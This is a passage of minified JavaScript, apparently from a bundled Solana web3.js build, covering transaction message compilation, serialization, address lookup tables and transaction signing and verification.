  class Qi extends Error {
    constructor(t) {
      super(`Signature ${t} has expired: block height exceeded.`),
        (this.signature = void 0),
        (this.signature = t);
    }
  }
  Object.defineProperty(Qi.prototype, "name", {
    value: "TransactionExpiredBlockheightExceededError",
  });
  class $i extends Error {
    constructor(t, e) {
      super(
        `Transaction was not confirmed in ${e.toFixed(
          2
        )} seconds. It is unknown if it succeeded or failed. Check signature ${t} using the Solana Explorer or CLI tools.`
      ),
        (this.signature = void 0),
        (this.signature = t);
    }
  }
  Object.defineProperty($i.prototype, "name", {
    value: "TransactionExpiredTimeoutError",
  });
  class ts extends Error {
    constructor(t) {
      super(`Signature ${t} has expired: the nonce is no longer valid.`),
        (this.signature = void 0),
        (this.signature = t);
    }
  }
  Object.defineProperty(ts.prototype, "name", {
    value: "TransactionExpiredNonceInvalidError",
  });
  class es {
    constructor(t, e) {
      (this.staticAccountKeys = void 0),
        (this.accountKeysFromLookups = void 0),
        (this.staticAccountKeys = t),
        (this.accountKeysFromLookups = e);
    }
    keySegments() {
      const t = [this.staticAccountKeys];
      return (
        this.accountKeysFromLookups &&
          (t.push(this.accountKeysFromLookups.writable),
          t.push(this.accountKeysFromLookups.readonly)),
        t
      );
    }
    get(t) {
      for (const e of this.keySegments()) {
        if (t < e.length) return e[t];
        t -= e.length;
      }
    }
    get length() {
      return this.keySegments().flat().length;
    }
    compileInstructions(t) {
      if (this.length > 256)
        throw new Error(
          "Account index overflow encountered during compilation"
        );
      const e = new Map();
      this.keySegments()
        .flat()
        .forEach((t, n) => {
          e.set(t.toBase58(), n);
        });
      const n = (t) => {
        const n = e.get(t.toBase58());
        if (void 0 === n)
          throw new Error(
            "Encountered an unknown instruction account key during compilation"
          );
        return n;
      };
      return t.map((t) => ({
        programIdIndex: n(t.programId),
        accountKeyIndexes: t.keys.map((t) => n(t.pubkey)),
        data: t.data,
      }));
    }
  }
  const ns = (t = "publicKey") => Cr.blob(32, t),
    rs = (t = "signature") => Cr.blob(64, t),
    os = (t = "string") => {
      const e = Cr.struct(
          [
            Cr.u32("length"),
            Cr.u32("lengthPadding"),
            Cr.blob(Cr.offset(Cr.u32(), -8), "chars"),
          ],
          t
        ),
        n = e.decode.bind(e),
        r = e.encode.bind(e),
        o = e;
      return (
        (o.decode = (t, e) => n(t, e).chars.toString()),
        (o.encode = (t, e, n) => {
          const o = { chars: lt.from(t, "utf8") };
          return r(o, e, n);
        }),
        (o.alloc = (t) =>
          Cr.u32().span + Cr.u32().span + lt.from(t, "utf8").length),
        o
      );
    };
  function is(t, e) {
    const n = (t) => {
      if (t.span >= 0) return t.span;
      if ("function" == typeof t.alloc) return t.alloc(e[t.property]);
      if ("count" in t && "elementLayout" in t) {
        const r = e[t.property];
        if (Array.isArray(r)) return r.length * n(t.elementLayout);
      } else if ("fields" in t) return is({ layout: t }, e[t.property]);
      return 0;
    };
    let r = 0;
    return (
      t.layout.fields.forEach((t) => {
        r += n(t);
      }),
      r
    );
  }
  function ss(t) {
    let e = 0,
      n = 0;
    for (;;) {
      let r = t.shift();
      if (((e |= (127 & r) << (7 * n)), (n += 1), !(128 & r))) break;
    }
    return e;
  }
  function as(t, e) {
    let n = e;
    for (;;) {
      let e = 127 & n;
      if (((n >>= 7), 0 == n)) {
        t.push(e);
        break;
      }
      (e |= 128), t.push(e);
    }
  }
  function us(t, e) {
    if (!t) throw new Error(e || "Assertion failed");
  }
  class cs {
    constructor(t, e) {
      (this.payer = void 0),
        (this.keyMetaMap = void 0),
        (this.payer = t),
        (this.keyMetaMap = e);
    }
    static compile(t, e) {
      const n = new Map(),
        r = (t) => {
          const e = t.toBase58();
          let r = n.get(e);
          return (
            void 0 === r &&
              ((r = { isSigner: !1, isWritable: !1, isInvoked: !1 }),
              n.set(e, r)),
            r
          );
        },
        o = r(e);
      (o.isSigner = !0), (o.isWritable = !0);
      for (const i of t) {
        r(i.programId).isInvoked = !0;
        for (const t of i.keys) {
          const e = r(t.pubkey);
          e.isSigner || (e.isSigner = t.isSigner),
            e.isWritable || (e.isWritable = t.isWritable);
        }
      }
      return new cs(e, n);
    }
    getMessageComponents() {
      const t = [...this.keyMetaMap.entries()];
      us(t.length <= 256, "Max static account keys length exceeded");
      const e = t.filter(([, t]) => t.isSigner && t.isWritable),
        n = t.filter(([, t]) => t.isSigner && !t.isWritable),
        r = t.filter(([, t]) => !t.isSigner && t.isWritable),
        o = t.filter(([, t]) => !t.isSigner && !t.isWritable),
        i = {
          numRequiredSignatures: e.length + n.length,
          numReadonlySignedAccounts: n.length,
          numReadonlyUnsignedAccounts: o.length,
        };
      {
        us(e.length > 0, "Expected at least one writable signer key");
        const [t] = e[0];
        us(
          t === this.payer.toBase58(),
          "Expected first writable signer key to be the fee payer"
        );
      }
      return [
        i,
        [
          ...e.map(([t]) => new Xi(t)),
          ...n.map(([t]) => new Xi(t)),
          ...r.map(([t]) => new Xi(t)),
          ...o.map(([t]) => new Xi(t)),
        ],
      ];
    }
    extractTableLookup(t) {
      const [e, n] = this.drainKeysFoundInLookupTable(
          t.state.addresses,
          (t) => !t.isSigner && !t.isInvoked && t.isWritable
        ),
        [r, o] = this.drainKeysFoundInLookupTable(
          t.state.addresses,
          (t) => !t.isSigner && !t.isInvoked && !t.isWritable
        );
      if (0 !== e.length || 0 !== r.length)
        return [
          { accountKey: t.key, writableIndexes: e, readonlyIndexes: r },
          { writable: n, readonly: o },
        ];
    }
    drainKeysFoundInLookupTable(t, e) {
      const n = new Array(),
        r = new Array();
      for (const [o, i] of this.keyMetaMap.entries())
        if (e(i)) {
          const e = new Xi(o),
            i = t.findIndex((t) => t.equals(e));
          i >= 0 &&
            (us(i < 256, "Max lookup table index exceeded"),
            n.push(i),
            r.push(e),
            this.keyMetaMap.delete(o));
        }
      return [n, r];
    }
  }
  const ls = "Reached end of buffer unexpectedly";
  function ds(t) {
    if (0 === t.length) throw new Error(ls);
    return t.shift();
  }
  function fs(t, ...e) {
    const [n] = e;
    if (2 === e.length ? n + (e[1] ?? 0) > t.length : n >= t.length)
      throw new Error(ls);
    return t.splice(...e);
  }
  class hs {
    constructor(t) {
      (this.header = void 0),
        (this.accountKeys = void 0),
        (this.recentBlockhash = void 0),
        (this.instructions = void 0),
        (this.indexToProgramIds = new Map()),
        (this.header = t.header),
        (this.accountKeys = t.accountKeys.map((t) => new Xi(t))),
        (this.recentBlockhash = t.recentBlockhash),
        (this.instructions = t.instructions),
        this.instructions.forEach((t) =>
          this.indexToProgramIds.set(
            t.programIdIndex,
            this.accountKeys[t.programIdIndex]
          )
        );
    }
    get version() {
      return "legacy";
    }
    get staticAccountKeys() {
      return this.accountKeys;
    }
    get compiledInstructions() {
      return this.instructions.map((t) => ({
        programIdIndex: t.programIdIndex,
        accountKeyIndexes: t.accounts,
        data: or.decode(t.data),
      }));
    }
    get addressTableLookups() {
      return [];
    }
    getAccountKeys() {
      return new es(this.staticAccountKeys);
    }
    static compile(t) {
      const e = cs.compile(t.instructions, t.payerKey),
        [n, r] = e.getMessageComponents(),
        o = new es(r)
          .compileInstructions(t.instructions)
          .map((t) => ({
            programIdIndex: t.programIdIndex,
            accounts: t.accountKeyIndexes,
            data: or.encode(t.data),
          }));
      return new hs({
        header: n,
        accountKeys: r,
        recentBlockhash: t.recentBlockhash,
        instructions: o,
      });
    }
    isAccountSigner(t) {
      return t < this.header.numRequiredSignatures;
    }
    isAccountWritable(t) {
      const e = this.header.numRequiredSignatures;
      if (t >= this.header.numRequiredSignatures) {
        return (
          t - e <
          this.accountKeys.length - e - this.header.numReadonlyUnsignedAccounts
        );
      }
      return t < e - this.header.numReadonlySignedAccounts;
    }
    isProgramId(t) {
      return this.indexToProgramIds.has(t);
    }
    programIds() {
      return [...this.indexToProgramIds.values()];
    }
    nonProgramIds() {
      return this.accountKeys.filter((t, e) => !this.isProgramId(e));
    }
    serialize() {
      const t = this.accountKeys.length;
      let e = [];
      as(e, t);
      const n = this.instructions.map((t) => {
        const { accounts: e, programIdIndex: n } = t,
          r = Array.from(or.decode(t.data));
        let o = [];
        as(o, e.length);
        let i = [];
        return (
          as(i, r.length),
          {
            programIdIndex: n,
            keyIndicesCount: lt.from(o),
            keyIndices: e,
            dataLength: lt.from(i),
            data: r,
          }
        );
      });
      let r = [];
      as(r, n.length);
      let o = lt.alloc(Ji);
      lt.from(r).copy(o);
      let i = r.length;
      n.forEach((t) => {
        const e = Cr.struct([
          Cr.u8("programIdIndex"),
          Cr.blob(t.keyIndicesCount.length, "keyIndicesCount"),
          Cr.seq(Cr.u8("keyIndex"), t.keyIndices.length, "keyIndices"),
          Cr.blob(t.dataLength.length, "dataLength"),
          Cr.seq(Cr.u8("userdatum"), t.data.length, "data"),
        ]).encode(t, o, i);
        i += e;
      }),
        (o = o.slice(0, i));
      const s = Cr.struct([
          Cr.blob(1, "numRequiredSignatures"),
          Cr.blob(1, "numReadonlySignedAccounts"),
          Cr.blob(1, "numReadonlyUnsignedAccounts"),
          Cr.blob(e.length, "keyCount"),
          Cr.seq(ns("key"), t, "keys"),
          ns("recentBlockhash"),
        ]),
        a = {
          numRequiredSignatures: lt.from([this.header.numRequiredSignatures]),
          numReadonlySignedAccounts: lt.from([
            this.header.numReadonlySignedAccounts,
          ]),
          numReadonlyUnsignedAccounts: lt.from([
            this.header.numReadonlyUnsignedAccounts,
          ]),
          keyCount: lt.from(e),
          keys: this.accountKeys.map((t) => Ki(t.toBytes())),
          recentBlockhash: or.decode(this.recentBlockhash),
        };
      let u = lt.alloc(2048);
      const c = s.encode(a, u);
      return o.copy(u, c), u.slice(0, c + o.length);
    }
    static from(t) {
      let e = [...t];
      const n = ds(e);
      if (n !== (n & Yi))
        throw new Error(
          "Versioned messages must be deserialized with VersionedMessage.deserialize()"
        );
      const r = ds(e),
        o = ds(e),
        i = ss(e);
      let s = [];
      for (let d = 0; d < i; d++) {
        const t = fs(e, 0, Vi);
        s.push(new Xi(lt.from(t)));
      }
      const a = fs(e, 0, Vi),
        u = ss(e);
      let c = [];
      for (let d = 0; d < u; d++) {
        const t = ds(e),
          n = fs(e, 0, ss(e)),
          r = fs(e, 0, ss(e)),
          o = or.encode(lt.from(r));
        c.push({ programIdIndex: t, accounts: n, data: o });
      }
      const l = {
        header: {
          numRequiredSignatures: n,
          numReadonlySignedAccounts: r,
          numReadonlyUnsignedAccounts: o,
        },
        recentBlockhash: or.encode(lt.from(a)),
        accountKeys: s,
        instructions: c,
      };
      return new hs(l);
    }
  }
  class ps {
    constructor(t) {
      (this.header = void 0),
        (this.staticAccountKeys = void 0),
        (this.recentBlockhash = void 0),
        (this.compiledInstructions = void 0),
        (this.addressTableLookups = void 0),
        (this.header = t.header),
        (this.staticAccountKeys = t.staticAccountKeys),
        (this.recentBlockhash = t.recentBlockhash),
        (this.compiledInstructions = t.compiledInstructions),
        (this.addressTableLookups = t.addressTableLookups);
    }
    get version() {
      return 0;
    }
    get numAccountKeysFromLookups() {
      let t = 0;
      for (const e of this.addressTableLookups)
        t += e.readonlyIndexes.length + e.writableIndexes.length;
      return t;
    }
    getAccountKeys(t) {
      let e;
      if (t && "accountKeysFromLookups" in t && t.accountKeysFromLookups) {
        if (
          this.numAccountKeysFromLookups !=
          t.accountKeysFromLookups.writable.length +
            t.accountKeysFromLookups.readonly.length
        )
          throw new Error(
            "Failed to get account keys because of a mismatch in the number of account keys from lookups"
          );
        e = t.accountKeysFromLookups;
      } else if (
        t &&
        "addressLookupTableAccounts" in t &&
        t.addressLookupTableAccounts
      )
        e = this.resolveAddressTableLookups(t.addressLookupTableAccounts);
      else if (this.addressTableLookups.length > 0)
        throw new Error(
          "Failed to get account keys because address table lookups were not resolved"
        );
      return new es(this.staticAccountKeys, e);
    }
    isAccountSigner(t) {
      return t < this.header.numRequiredSignatures;
    }
    isAccountWritable(t) {
      const e = this.header.numRequiredSignatures,
        n = this.staticAccountKeys.length;
      if (t >= n) {
        return (
          t - n <
          this.addressTableLookups.reduce(
            (t, e) => t + e.writableIndexes.length,
            0
          )
        );
      }
      if (t >= this.header.numRequiredSignatures) {
        return t - e < n - e - this.header.numReadonlyUnsignedAccounts;
      }
      return t < e - this.header.numReadonlySignedAccounts;
    }
    resolveAddressTableLookups(t) {
      const e = { writable: [], readonly: [] };
      for (const n of this.addressTableLookups) {
        const r = t.find((t) => t.key.equals(n.accountKey));
        if (!r)
          throw new Error(
            `Failed to find address lookup table account for table key ${n.accountKey.toBase58()}`
          );
        for (const t of n.writableIndexes) {
          if (!(t < r.state.addresses.length))
            throw new Error(
              `Failed to find address for index ${t} in address lookup table ${n.accountKey.toBase58()}`
            );
          e.writable.push(r.state.addresses[t]);
        }
        for (const t of n.readonlyIndexes) {
          if (!(t < r.state.addresses.length))
            throw new Error(
              `Failed to find address for index ${t} in address lookup table ${n.accountKey.toBase58()}`
            );
          e.readonly.push(r.state.addresses[t]);
        }
      }
      return e;
    }
    static compile(t) {
      const e = cs.compile(t.instructions, t.payerKey),
        n = new Array(),
        r = { writable: new Array(), readonly: new Array() },
        o = t.addressLookupTableAccounts || [];
      for (const u of o) {
        const t = e.extractTableLookup(u);
        if (void 0 !== t) {
          const [e, { writable: o, readonly: i }] = t;
          n.push(e), r.writable.push(...o), r.readonly.push(...i);
        }
      }
      const [i, s] = e.getMessageComponents(),
        a = new es(s, r).compileInstructions(t.instructions);
      return new ps({
        header: i,
        staticAccountKeys: s,
        recentBlockhash: t.recentBlockhash,
        compiledInstructions: a,
        addressTableLookups: n,
      });
    }
    serialize() {
      const t = Array();
      as(t, this.staticAccountKeys.length);
      const e = this.serializeInstructions(),
        n = Array();
      as(n, this.compiledInstructions.length);
      const r = this.serializeAddressTableLookups(),
        o = Array();
      as(o, this.addressTableLookups.length);
      const i = Cr.struct([
          Cr.u8("prefix"),
          Cr.struct(
            [
              Cr.u8("numRequiredSignatures"),
              Cr.u8("numReadonlySignedAccounts"),
              Cr.u8("numReadonlyUnsignedAccounts"),
            ],
            "header"
          ),
          Cr.blob(t.length, "staticAccountKeysLength"),
          Cr.seq(ns(), this.staticAccountKeys.length, "staticAccountKeys"),
          ns("recentBlockhash"),
          Cr.blob(n.length, "instructionsLength"),
          Cr.blob(e.length, "serializedInstructions"),
          Cr.blob(o.length, "addressTableLookupsLength"),
          Cr.blob(r.length, "serializedAddressTableLookups"),
        ]),
        s = new Uint8Array(Ji),
        a = i.encode(
          {
            prefix: 128,
            header: this.header,
            staticAccountKeysLength: new Uint8Array(t),
            staticAccountKeys: this.staticAccountKeys.map((t) => t.toBytes()),
            recentBlockhash: or.decode(this.recentBlockhash),
            instructionsLength: new Uint8Array(n),
            serializedInstructions: e,
            addressTableLookupsLength: new Uint8Array(o),
            serializedAddressTableLookups: r,
          },
          s
        );
      return s.slice(0, a);
    }
    serializeInstructions() {
      let t = 0;
      const e = new Uint8Array(Ji);
      for (const n of this.compiledInstructions) {
        const r = Array();
        as(r, n.accountKeyIndexes.length);
        const o = Array();
        as(o, n.data.length);
        t += Cr.struct([
          Cr.u8("programIdIndex"),
          Cr.blob(r.length, "encodedAccountKeyIndexesLength"),
          Cr.seq(Cr.u8(), n.accountKeyIndexes.length, "accountKeyIndexes"),
          Cr.blob(o.length, "encodedDataLength"),
          Cr.blob(n.data.length, "data"),
        ]).encode(
          {
            programIdIndex: n.programIdIndex,
            encodedAccountKeyIndexesLength: new Uint8Array(r),
            accountKeyIndexes: n.accountKeyIndexes,
            encodedDataLength: new Uint8Array(o),
            data: n.data,
          },
          e,
          t
        );
      }
      return e.slice(0, t);
    }
    serializeAddressTableLookups() {
      let t = 0;
      const e = new Uint8Array(Ji);
      for (const n of this.addressTableLookups) {
        const r = Array();
        as(r, n.writableIndexes.length);
        const o = Array();
        as(o, n.readonlyIndexes.length);
        t += Cr.struct([
          ns("accountKey"),
          Cr.blob(r.length, "encodedWritableIndexesLength"),
          Cr.seq(Cr.u8(), n.writableIndexes.length, "writableIndexes"),
          Cr.blob(o.length, "encodedReadonlyIndexesLength"),
          Cr.seq(Cr.u8(), n.readonlyIndexes.length, "readonlyIndexes"),
        ]).encode(
          {
            accountKey: n.accountKey.toBytes(),
            encodedWritableIndexesLength: new Uint8Array(r),
            writableIndexes: n.writableIndexes,
            encodedReadonlyIndexesLength: new Uint8Array(o),
            readonlyIndexes: n.readonlyIndexes,
          },
          e,
          t
        );
      }
      return e.slice(0, t);
    }
    static deserialize(t) {
      let e = [...t];
      const n = ds(e),
        r = n & Yi;
      us(n !== r, "Expected versioned message but received legacy message");
      us(
        0 === r,
        `Expected versioned message with version 0 but found version ${r}`
      );
      const o = {
          numRequiredSignatures: ds(e),
          numReadonlySignedAccounts: ds(e),
          numReadonlyUnsignedAccounts: ds(e),
        },
        i = [],
        s = ss(e);
      for (let f = 0; f < s; f++) i.push(new Xi(fs(e, 0, Vi)));
      const a = or.encode(fs(e, 0, Vi)),
        u = ss(e),
        c = [];
      for (let f = 0; f < u; f++) {
        const t = ds(e),
          n = fs(e, 0, ss(e)),
          r = ss(e),
          o = new Uint8Array(fs(e, 0, r));
        c.push({ programIdIndex: t, accountKeyIndexes: n, data: o });
      }
      const l = ss(e),
        d = [];
      for (let f = 0; f < l; f++) {
        const t = new Xi(fs(e, 0, Vi)),
          n = fs(e, 0, ss(e)),
          r = fs(e, 0, ss(e));
        d.push({ accountKey: t, writableIndexes: n, readonlyIndexes: r });
      }
      return new ps({
        header: o,
        staticAccountKeys: i,
        recentBlockhash: a,
        compiledInstructions: c,
        addressTableLookups: d,
      });
    }
  }
  const ms = {
    deserializeMessageVersion(t) {
      const e = t[0],
        n = e & Yi;
      return n === e ? "legacy" : n;
    },
    deserialize: (t) => {
      const e = ms.deserializeMessageVersion(t);
      if ("legacy" === e) return hs.from(t);
      if (0 === e) return ps.deserialize(t);
      throw new Error(
        `Transaction message version ${e} deserialization is not supported`
      );
    },
  };
  let gs = (function (t) {
    return (
      (t[(t.BLOCKHEIGHT_EXCEEDED = 0)] = "BLOCKHEIGHT_EXCEEDED"),
      (t[(t.PROCESSED = 1)] = "PROCESSED"),
      (t[(t.TIMED_OUT = 2)] = "TIMED_OUT"),
      (t[(t.NONCE_INVALID = 3)] = "NONCE_INVALID"),
      t
    );
  })({});
  const ys = lt.alloc(64).fill(0);
  class ws {
    constructor(t) {
      (this.keys = void 0),
        (this.programId = void 0),
        (this.data = lt.alloc(0)),
        (this.programId = t.programId),
        (this.keys = t.keys),
        t.data && (this.data = t.data);
    }
    toJSON() {
      return {
        keys: this.keys.map(({ pubkey: t, isSigner: e, isWritable: n }) => ({
          pubkey: t.toJSON(),
          isSigner: e,
          isWritable: n,
        })),
        programId: this.programId.toJSON(),
        data: [...this.data],
      };
    }
  }
  class bs {
    get signature() {
      return this.signatures.length > 0 ? this.signatures[0].signature : null;
    }
    constructor(t) {
      if (
        ((this.signatures = []),
        (this.feePayer = void 0),
        (this.instructions = []),
        (this.recentBlockhash = void 0),
        (this.lastValidBlockHeight = void 0),
        (this.nonceInfo = void 0),
        (this.minNonceContextSlot = void 0),
        (this._message = void 0),
        (this._json = void 0),
        t)
      )
        if (
          (t.feePayer && (this.feePayer = t.feePayer),
          t.signatures && (this.signatures = t.signatures),
          Object.prototype.hasOwnProperty.call(t, "nonceInfo"))
        ) {
          const { minContextSlot: e, nonceInfo: n } = t;
          (this.minNonceContextSlot = e), (this.nonceInfo = n);
        } else if (
          Object.prototype.hasOwnProperty.call(t, "lastValidBlockHeight")
        ) {
          const { blockhash: e, lastValidBlockHeight: n } = t;
          (this.recentBlockhash = e), (this.lastValidBlockHeight = n);
        } else {
          const { recentBlockhash: e, nonceInfo: n } = t;
          n && (this.nonceInfo = n), (this.recentBlockhash = e);
        }
    }
    toJSON() {
      return {
        recentBlockhash: this.recentBlockhash || null,
        feePayer: this.feePayer ? this.feePayer.toJSON() : null,
        nonceInfo: this.nonceInfo
          ? {
              nonce: this.nonceInfo.nonce,
              nonceInstruction: this.nonceInfo.nonceInstruction.toJSON(),
            }
          : null,
        instructions: this.instructions.map((t) => t.toJSON()),
        signers: this.signatures.map(({ publicKey: t }) => t.toJSON()),
      };
    }
    add(...t) {
      if (0 === t.length) throw new Error("No instructions");
      return (
        t.forEach((t) => {
          "instructions" in t
            ? (this.instructions = this.instructions.concat(t.instructions))
            : "data" in t && "programId" in t && "keys" in t
            ? this.instructions.push(t)
            : this.instructions.push(new ws(t));
        }),
        this
      );
    }
    compileMessage() {
      if (
        this._message &&
        JSON.stringify(this.toJSON()) === JSON.stringify(this._json)
      )
        return this._message;
      let t, e, n;
      if (
        (this.nonceInfo
          ? ((t = this.nonceInfo.nonce),
            (e =
              this.instructions[0] != this.nonceInfo.nonceInstruction
                ? [this.nonceInfo.nonceInstruction, ...this.instructions]
                : this.instructions))
          : ((t = this.recentBlockhash), (e = this.instructions)),
        !t)
      )
        throw new Error("Transaction recentBlockhash required");
      if ((e.length < 1, 0, this.feePayer)) n = this.feePayer;
      else {
        if (!(this.signatures.length > 0 && this.signatures[0].publicKey))
          throw new Error("Transaction fee payer required");
        n = this.signatures[0].publicKey;
      }
      for (let p = 0; p < e.length; p++)
        if (void 0 === e[p].programId)
          throw new Error(
            `Transaction instruction index ${p} has undefined program id`
          );
      const r = [],
        o = [];
      e.forEach((t) => {
        t.keys.forEach((t) => {
          o.push({ ...t });
        });
        const e = t.programId.toString();
        r.includes(e) || r.push(e);
      }),
        r.forEach((t) => {
          o.push({ pubkey: new Xi(t), isSigner: !1, isWritable: !1 });
        });
      const i = [];
      o.forEach((t) => {
        const e = t.pubkey.toString(),
          n = i.findIndex((t) => t.pubkey.toString() === e);
        n > -1
          ? ((i[n].isWritable = i[n].isWritable || t.isWritable),
            (i[n].isSigner = i[n].isSigner || t.isSigner))
          : i.push(t);
      }),
        i.sort(function (t, e) {
          if (t.isSigner !== e.isSigner) return t.isSigner ? -1 : 1;
          if (t.isWritable !== e.isWritable) return t.isWritable ? -1 : 1;
          return t.pubkey
            .toBase58()
            .localeCompare(e.pubkey.toBase58(), "en", {
              localeMatcher: "best fit",
              usage: "sort",
              sensitivity: "variant",
              ignorePunctuation: !1,
              numeric: !1,
              caseFirst: "lower",
            });
        });
      const s = i.findIndex((t) => t.pubkey.equals(n));
      if (s > -1) {
        const [t] = i.splice(s, 1);
        (t.isSigner = !0), (t.isWritable = !0), i.unshift(t);
      } else i.unshift({ pubkey: n, isSigner: !0, isWritable: !0 });
      for (const p of this.signatures) {
        const t = i.findIndex((t) => t.pubkey.equals(p.publicKey));
        if (!(t > -1))
          throw new Error(`unknown signer: ${p.publicKey.toString()}`);
        i[t].isSigner || (i[t].isSigner = !0);
      }
      let a = 0,
        u = 0,
        c = 0;
      const l = [],
        d = [];
      i.forEach(({ pubkey: t, isSigner: e, isWritable: n }) => {
        e
          ? (l.push(t.toString()), (a += 1), n || (u += 1))
          : (d.push(t.toString()), n || (c += 1));
      });
      const f = l.concat(d),
        h = e.map((t) => {
          const { data: e, programId: n } = t;
          return {
            programIdIndex: f.indexOf(n.toString()),
            accounts: t.keys.map((t) => f.indexOf(t.pubkey.toString())),
            data: or.encode(e),
          };
        });
      return (
        h.forEach((t) => {
          us(t.programIdIndex >= 0), t.accounts.forEach((t) => us(t >= 0));
        }),
        new hs({
          header: {
            numRequiredSignatures: a,
            numReadonlySignedAccounts: u,
            numReadonlyUnsignedAccounts: c,
          },
          accountKeys: f,
          recentBlockhash: t,
          instructions: h,
        })
      );
    }
    _compile() {
      const t = this.compileMessage(),
        e = t.accountKeys.slice(0, t.header.numRequiredSignatures);
      if (this.signatures.length === e.length) {
        if (this.signatures.every((t, n) => e[n].equals(t.publicKey))) return t;
      }
      return (
        (this.signatures = e.map((t) => ({ signature: null, publicKey: t }))), t
      );
    }
    serializeMessage() {
      return this._compile().serialize();
    }
    async getEstimatedFee(t) {
      return (await t.getFeeForMessage(this.compileMessage())).value;
    }
    setSigners(...t) {
      if (0 === t.length) throw new Error("No signers");
      const e = new Set();
      this.signatures = t
        .filter((t) => {
          const n = t.toString();
          return !e.has(n) && (e.add(n), !0);
        })
        .map((t) => ({ signature: null, publicKey: t }));
    }
    sign(...t) {
      if (0 === t.length) throw new Error("No signers");
      const e = new Set(),
        n = [];
      for (const o of t) {
        const t = o.publicKey.toString();
        e.has(t) || (e.add(t), n.push(o));
      }
      this.signatures = n.map((t) => ({
        signature: null,
        publicKey: t.publicKey,
      }));
      const r = this._compile();
      this._partialSign(r, ...n);
    }
    partialSign(...t) {
      if (0 === t.length) throw new Error("No signers");
      const e = new Set(),
        n = [];
      for (const o of t) {
        const t = o.publicKey.toString();
        e.has(t) || (e.add(t), n.push(o));
      }
      const r = this._compile();
      this._partialSign(r, ...n);
    }
    _partialSign(t, ...e) {
      const n = t.serialize();
      e.forEach((t) => {
        const e = Wi(n, t.secretKey);
        this._addSignature(t.publicKey, Ki(e));
      });
    }
    addSignature(t, e) {
      this._compile(), this._addSignature(t, e);
    }
    _addSignature(t, e) {
      us(64 === e.length);
      const n = this.signatures.findIndex((e) => t.equals(e.publicKey));
      if (n < 0) throw new Error(`unknown signer: ${t.toString()}`);
      this.signatures[n].signature = lt.from(e);
    }
    verifySignatures(t = !0) {
      return !this._getMessageSignednessErrors(this.serializeMessage(), t);
    }
    _getMessageSignednessErrors(t, e) {
      const n = {};
      for (const { signature: r, publicKey: o } of this.signatures)
        null === r
          ? e && (n.missing || (n.missing = [])).push(o)
          : zi(r, t, o.toBytes()) || (n.invalid || (n.invalid = [])).push(o);
      return n.invalid || n.missing ? n : void 0;
    }
    serialize(t) {
      const { requireAllSignatures: e, verifySignatures: n } = Object.assign(
          { requireAllSignatures: !0, verifySignatures: !0 },
          t
        ),
        r = this.serializeMessage();
      if (n) {
        const t = this._getMessageSignednessErrors(r, e);
        if (t) {
          let e = "Signature verification failed.";
          throw (
            (t.invalid &&
              (e += `\nInvalid signature for public key${
                1 === t.invalid.length ? "" : "(s)"
              } [\`${t.invalid.map((t) => t.toBase58()).join("`, `")}\`].`),
            t.missing &&
              (e += `\nMissing signature for public key${
                1 === t.missing.length ? "" : "(s)"
              } [\`${t.missing.map((t) => t.toBase58()).join("`, `")}\`].`),
            new Error(e))
          );
        }
      }
      return this._serialize(r);
    }
    _serialize(t) {
      const { signatures: e } = this,
        n = [];
      as(n, e.length);
      const r = n.length + 64 * e.length + t.length,
        o = lt.alloc(r);
      return (
        us(e.length < 256),
        lt.from(n).copy(o, 0),
        e.forEach(({ signature: t }, e) => {
          null !== t &&
            (us(64 === t.length, "signature has invalid length"),
            lt.from(t).copy(o, n.length + 64 * e));
        }),
        t.copy(o, n.length + 64 * e.length),
        us(o.length <= Ji, `Transaction too large: ${o.length} > 1232`),
        o
      );
    }
    get keys() {
      return (
        us(1 === this.instructions.length),
        this.instructions[0].keys.map((t) => t.pubkey)
      );
    }
    get programId() {
      return us(1 === this.instructions.length), this.instructions[0].programId;
    }
    get data() {
      return us(1 === this.instructions.length), this.instructions[0].data;
    }
    static from(t) {
      let e = [...t];
      const n = ss(e);
      let r = [];
      for (let o = 0; o < n; o++) {
        const t = fs(e, 0, 64);
        r.push(or.encode(lt.from(t)));
      }
      return bs.populate(hs.from(e), r);
    }
    static populate(t, e = []) {
      const n = new bs();
      return (
        (n.recentBlockhash = t.recentBlockhash),
        t.header.numRequiredSignatures > 0 && (n.feePayer = t.accountKeys[0]),
        e.forEach((e, r) => {
          const o = {
            signature: e == or.encode(ys) ? null : or.decode(e),
            publicKey: t.accountKeys[r],
          };
          n.signatures.push(o);
        }),
        t.instructions.forEach((e) => {
          const r = e.accounts.map((e) => {
            const r = t.accountKeys[e];
            return {
              pubkey: r,
              isSigner:
                n.signatures.some(
                  (t) => t.publicKey.toString() === r.toString()
                ) || t.isAccountSigner(e),
              isWritable: t.isAccountWritable(e),
            };
          });
          n.instructions.push(
            new ws({
              keys: r,
              programId: t.accountKeys[e.programIdIndex],
              data: or.decode(e.data),
            })
          );
        }),
        (n._message = t),
        (n._json = n.toJSON()),
        n
      );
    }
  }
  class vs {
    constructor(t) {
      (this.payerKey = void 0),
        (this.instructions = void 0),
        (this.recentBlockhash = void 0),
        (this.payerKey = t.payerKey),
        (this.instructions = t.instructions),
        (this.recentBlockhash = t.recentBlockhash);
    }
    static decompile(t, e) {
      const { header: n, compiledInstructions: r, recentBlockhash: o } = t,
        {
          numRequiredSignatures: i,
          numReadonlySignedAccounts: s,
          numReadonlyUnsignedAccounts: a,
        } = n,
        u = i - s;
      us(u > 0, "Message header is invalid");
      const c = t.staticAccountKeys.length - i - a;
      us(c >= 0, "Message header is invalid");
      const l = t.getAccountKeys(e),
        d = l.get(0);
      if (void 0 === d)
        throw new Error(
          "Failed to decompile message because no account keys were found"
        );
      const f = [];
      for (const h of r) {
        const t = [];
        for (const r of h.accountKeyIndexes) {
          const e = l.get(r);
          if (void 0 === e)
            throw new Error(`Failed to find key for account key index ${r}`);
          let o;
          (o =
            r < i
              ? r < u
              : r < l.staticAccountKeys.length
              ? r - i < c
              : r - l.staticAccountKeys.length <
                l.accountKeysFromLookups.writable.length),
            t.push({
              pubkey: e,
              isSigner: r < n.numRequiredSignatures,
              isWritable: o,
            });
        }
        const e = l.get(h.programIdIndex);
        if (void 0 === e)
          throw new Error(
            `Failed to find program id for program id index ${h.programIdIndex}`
          );
        f.push(new ws({ programId: e, data: Ki(h.data), keys: t }));
      }
      return new vs({ payerKey: d, instructions: f, recentBlockhash: o });
    }
    compileToLegacyMessage() {
      return hs.compile({
        payerKey: this.payerKey,
        recentBlockhash: this.recentBlockhash,
        instructions: this.instructions,
      });
    }
    compileToV0Message(t) {
      return ps.compile({
        payerKey: this.payerKey,
        recentBlockhash: this.recentBlockhash,
        instructions: this.instructions,
        addressLookupTableAccounts: t,
      });
    }
  }
  class As {
